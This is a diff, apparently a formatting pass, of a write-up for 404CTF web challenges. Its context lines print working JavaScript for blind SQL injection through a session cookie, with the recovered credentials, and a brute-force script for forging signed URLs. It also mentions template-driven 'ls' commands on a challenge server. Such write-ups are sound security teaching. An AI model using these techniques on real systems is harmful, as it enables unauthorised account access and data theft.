@@ -9,8 +9,7 @@ tag: "404CTF"
 slug: "web"
 language: "english"
 image: "/static/media/404ctf/event_logo.png"
-keywords:
-  ["Cybersecurity", "404CTF", "Diverse"]
+keywords: ["Cybersecurity", "404CTF", "Diverse"]
 links: ["forensics", "stegano", "reverse"]
 ---
 
@@ -23,7 +22,7 @@ We visit the [website](https://le-loup-et-le-renard.challenges.404ctf.fr/) and l
 
 This brings us to the [2nd part](https://le-loup-et-le-renard.challenges.404ctf.fr/fable/partie-2-cookie) of the challenge.
 
-Following the page title `Part 2: Cookie`, we look at the cookies sent by the server: 
+Following the page title `Part 2: Cookie`, we look at the cookies sent by the server:
 
 ![](/static/media/404ctf/le-loup-et-le-renard-2.png)
 
@@ -72,13 +71,15 @@ And that's it, it worked !
 
 We visit the [website](https://academie.challenges.404ctf.fr/) and do some exploring:
 To sum it up:
+
 - We can create an account and log in into it
-![](/static/media/404ctf/la-vie-française-1.png)
+  ![](/static/media/404ctf/la-vie-française-1.png)
 
 - we are then redirected to `/account` which is an SSR can somehow relates to the account type.
-![](/static/media/404ctf/la-vie-française-2.png)
+  ![](/static/media/404ctf/la-vie-française-2.png)
 
 Some restrictions on the form inputs:
+
 - Only alphanumeric characters are allowed
 - the `admin` account is deactivated by the administrator
 
@@ -89,16 +90,19 @@ If we try to use an SQL injection attack the `uuid` field of the cookie, it work
 
 ```javascript
 const testUsername = async (username) => {
-  const response = await fetch("https://la-vie-francaise.challenges.404ctf.fr/account", {
-    redirect: "manual",
-    headers: {
-      "Cookie": `uuid=' OR username LIKE '${username}%`
+  const response = await fetch(
+    "https://la-vie-francaise.challenges.404ctf.fr/account",
+    {
+      redirect: "manual",
+      headers: {
+        Cookie: `uuid=' OR username LIKE '${username}%`,
+      },
     }
-  });
+  );
 
   // otherwise a redirection code 3xx
   return response.status === 200;
-}
+};
 ```
 
 This method (and others similar) allow us to construct a valid `username` character by character (because of the % in the end) and since we are restricted to alphanumeric, it won't take long.
@@ -108,59 +112,60 @@ For the username, we try different requests and we see that the user `madeleinef
 Here is an implementation for testing all the next characters in the passwords and outputting the next one:
 
 ```javascript
-const characters = 'abcdefghijklmnopqrstuvwxyz0123456789'.split('')
+const characters = "abcdefghijklmnopqrstuvwxyz0123456789".split("");
 
 const testPassword = async (password) => {
-  const response = await fetch("https://la-vie-francaise.challenges.404ctf.fr/account", {
-    redirect: "manual",
-    headers: {
-      "Cookie": `uuid=' OR username = 'madeleineforestier' AND password LIKE '${password}%`
+  const response = await fetch(
+    "https://la-vie-francaise.challenges.404ctf.fr/account",
+    {
+      redirect: "manual",
+      headers: {
+        Cookie: `uuid=' OR username = 'madeleineforestier' AND password LIKE '${password}%`,
+      },
     }
-  });
+  );
 
   return response.status === 200;
-}
+};
 
 const flood = (prefix) =>
-  Promise.all(characters.map(c => testPassword(prefix + c)))
+  Promise.all(characters.map((c) => testPassword(prefix + c)));
 
 const crack = async (prefix) => {
   let safetyCount = 0;
-  while ( safetyCount < 100) {
+  while (safetyCount < 100) {
     console.log("Now at length", prefix.length + safetyCount++, "=>", prefix);
     const charIsValid = await flood(prefix);
-    console.log(charIsValid)
+    console.log(charIsValid);
     const nextIndex = charIsValid.indexOf(true);
-    const finished = nextIndex ===  -1;
-    if ( finished ) break;
-    prefix += characters[nextIndex]
+    const finished = nextIndex === -1;
+    if (finished) break;
+    prefix += characters[nextIndex];
   }
 
   return prefix;
-}
+};
 
-crack("").then(console.log)
+crack("").then(console.log);
 //madeleineforestier:fo2dvkgshz2ppj
 ```
 
 We try those credentials and access the `/admin` route for the flag.
 ![](/static/media/404ctf/la-vie-française-3.png)
 
-
 ### Fuite en 1791
 
 We visit the [challenge website](https://ddfc.challenges.404ctf.fr/). After walking around, we find that the flag url is given to url, but it is protected by an expiry date and a signature.
 ![](/static/media/404ctf/fuite-en-1791-1.png)
 
-
 It looks like we have to forge a new signature for an expiry date of our liking. In general this is not possible because the link (or any part of) is cryptographically signed.
 But maybe could have inveted his own signature algorithm, in which can we can try to reverse it or crack it.
 
 ![](/static/media/404ctf/fuite-en-1791-2.png)
- 
+
 Let's try out different values of the `expiry` and `signature` and we notice that some values do work (return "Expired Link" instead of "Invalid signature").
 
-For example:  <span class="break-words">`expiry=-5625891070&signature=wawF6dC4Hz9g5NyCc3j1KCDcfztFE/sv`</span>.
+For example: <span class="break-words">`expiry=-5625891070&signature=wawF6dC4Hz9g5NyCc3j1KCDcfztFE/sv`</span>.
 
 The signature looks like a base64 encoding for the expiry value + maybe some salt or something similar.
 
@@ -187,39 +192,121 @@ The target charcater is at the `-11th` location, we expect it to change the `-14
 Here is a script that does just that:
 
 ```javascript
-const base = "https://ddfc.challenges.404ctf.fr/ddfc"
+const base = "https://ddfc.challenges.404ctf.fr/ddfc";
 const queries = {
   expiry: "-5625891076",
-  signature: "wawF6dC4Hz9g5NyCc3j1KCDcfztFE/sp"
+  signature: "wawF6dC4Hz9g5NyCc3j1KCDcfztFE/sp",
 };
 
-const base64 = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'];
+const base64 = [
+  "A",
+  "B",
+  "C",
+  "D",
+  "E",
+  "F",
+  "G",
+  "H",
+  "I",
+  "J",
+  "K",
+  "L",
+  "M",
+  "N",
+  "O",
+  "P",
+  "Q",
+  "R",
+  "S",
+  "T",
+  "U",
+  "V",
+  "W",
+  "X",
+  "Y",
+  "Z",
+  "a",
+  "b",
+  "c",
+  "d",
+  "e",
+  "f",
+  "g",
+  "h",
+  "i",
+  "j",
+  "k",
+  "l",
+  "m",
+  "n",
+  "o",
+  "p",
+  "q",
+  "r",
+  "s",
+  "t",
+  "u",
+  "v",
+  "w",
+  "x",
+  "y",
+  "z",
+  "0",
+  "1",
+  "2",
+  "3",
+  "4",
+  "5",
+  "6",
+  "7",
+  "8",
+  "9",
+  "+",
+  "/",
+];
 const base64encode = (number) => {
   output = "";
-  while ( number ) { output = base64[number % 64] + output; number = number / 64 | 0; }
+  while (number) {
+    output = base64[number % 64] + output;
+    number = (number / 64) | 0;
+  }
   return output;
-}
+};
 
-const buildUrl = (base, queries) => base + "?" + Object.entries(queries).map(([n, v]) => `${n}=${v}`).join('&');
+const buildUrl = (base, queries) =>
+  base +
+  "?" +
+  Object.entries(queries)
+    .map(([n, v]) => `${n}=${v}`)
+    .join("&");
 const checkUrl = async (base, entries) => {
   const url = buildUrl(base, entries);
   const response = await fetch(url);
   const content = await response.text();
   return content.indexOf("Invalid") < 0;
-}
+};
 
-const replaceIndex = (str, i, c) => str.slice(0, i) + c + (i == -1 ? "" : str.slice(i+1))
+const replaceIndex = (str, i, c) =>
+  str.slice(0, i) + c + (i == -1 ? "" : str.slice(i + 1));
 
 const findSignature = async () => {
   // launch 64 requests at once
-  const expiry = replaceIndex(queries.expiry, -11, '+');
-  const results = await Promise.all(base64.map(c => checkUrl(base, {
-    expiry,
-    signature: replaceIndex(queries.signature, -14, c)
-  })));
-    
+  const expiry = replaceIndex(queries.expiry, -11, "+");
+  const results = await Promise.all(
+    base64.map((c) =>
+      checkUrl(base, {
+        expiry,
+        signature: replaceIndex(queries.signature, -14, c),
+      })
+    )
+  );
+
   const index = results.indexOf(true);
-  console.log("url", expiry, replaceIndex(queries.signature, -14, base64[index]))
+  console.log(
+    "url",
+    expiry,
+    replaceIndex(queries.signature, -14, base64[index])
+  );
 
   return base64[index];
 };
@@ -235,7 +322,7 @@ main();
 
 If the try that url, we get the human rights declaration and in the bottom of the page, the flag:
 ![](/static/media/404ctf/fuite-en-1791-3.png)
- 
+
 ### L'Épistolaire moderne
 
 In this challenge, we encounter a Single Page Application (SPA) that initially allows us to log in.
@@ -249,6 +336,7 @@ Exploring the chat's features, I noticed that it can preview the titles of links
 In the end, I concluded that there is nothing I can get out from this chat and turned my attention to the source code / cookies.
 
 Here are my observations:
+
 - There is a route to get the flag: `api/bgfmwqgccmk`
 - This route is protected by a JWT token (for example, without my JWT authentication, I get a 403 response)
 - I tried common attacks against the token but none worked
@@ -325,4 +413,4 @@ curl -X POST "https://chanson-d-inde.challenges.404ctf.fr/scene" -d "url=www.goo
 
 Which returns the flag: `404CTF{v01la_Ind14_S0ng_s3_tErm1n3}`.
 
-*PS: I found this route by running `ls` commands using the same template.*
+_PS: I found this route by running `ls` commands using the same template._
